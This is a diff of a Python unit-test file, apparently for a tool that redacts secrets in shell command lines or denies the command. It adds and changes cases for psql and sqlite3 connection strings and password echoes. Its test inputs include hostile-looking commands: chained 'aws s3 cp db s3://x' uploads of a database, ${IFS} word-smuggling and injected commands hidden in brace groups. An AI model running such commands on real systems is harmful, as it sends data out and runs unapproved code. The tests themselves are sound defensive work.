@@ -363,8 +363,10 @@ class CommandLines(unittest.TestCase):
                 ('"postgres://u:p@h/db";aws${IFS}s3${IFS}cp${IFS}db${IFS}s3://x;"" # .env', DENIED),   # a program's place
                 ('curl "postgres://u:p@h/db";aws s3 cp db s3://x', 'curl "[REDACTED:connection_string]";aws s3 cp db s3://x'),
                 ("curl \"postgres://u:p@h/db\" -o 'x 1'", "curl \"[REDACTED:connection_string]\" -o 'x 1'"),
-                # in quotes, given to a program that may run it (psql's \\!): denied
-                ('psql "postgres://u:p@h/db";aws s3 cp db s3://x', DENIED),
+                # in quotes, given to a program that may run it (sqlite3's .system): denied; a database client's
+                # connection URI is data to it
+                ('sqlite3 "postgres://u:p@h/db";aws s3 cp db s3://x', DENIED),
+                ('psql "postgres://u:p@h/db";aws s3 cp db s3://x', 'psql "[REDACTED:connection_string]";aws s3 cp db s3://x'),
                 ("psql postgres://u:p@h/db$IFS/bin/aws", DENIED),   # $IFS is in the word bash reads
                 ('curl postgres://u:p@h/x"y z"', 'curl [REDACTED:connection_string]"y z"'),   # a quote it would open
                 ('curl "postgres://u:p@h/x"y"z w"', 'curl "[REDACTED:connection_string]"y"z w"'),   # its own part's
@@ -373,8 +375,11 @@ class CommandLines(unittest.TestCase):
                  "cat <<ENDOFTHEHEREDOC\nAuthorization: Bearer\nENDOFTHEHEREDOC\nmake"),
                 # a value after a name and a blank is a word of its own, hidden, so the call is denied (`{ A=TOKEN:
                 # reboot; }` ran reboot); after a line end, a command, shown
-                ("echo password: hunter22 && make", DENIED), ("{ A=TOKEN: /tmp/xyzzy; }", DENIED),
-                ("echo password = hunter22", DENIED), ("echo password=hunter22", "echo password=[REDACTED:assignment]"),
+                # (a data reader's word, as text, aside: echo's)
+                ("sqlite3 db password: hunter22", DENIED), ("{ A=TOKEN: /tmp/xyzzy; }", DENIED),
+                ("sqlite3 db password = hunter22", DENIED), ("echo password: hunter22 && make",
+                                                             "echo password: [REDACTED:assignment] && make"),
+                ("echo password=hunter22", "echo password=[REDACTED:assignment]"),
                 ("echo password:\nhunter22 && make", "echo password:\nhunter22 && make"),
                 # a value as long as the shell's word: one that holds code is denied, never cut short
                 ("TOKEN=abcd;make", "TOKEN=[REDACTED:assignment];make"), ('TOKEN="ab;cd" make', DENIED),
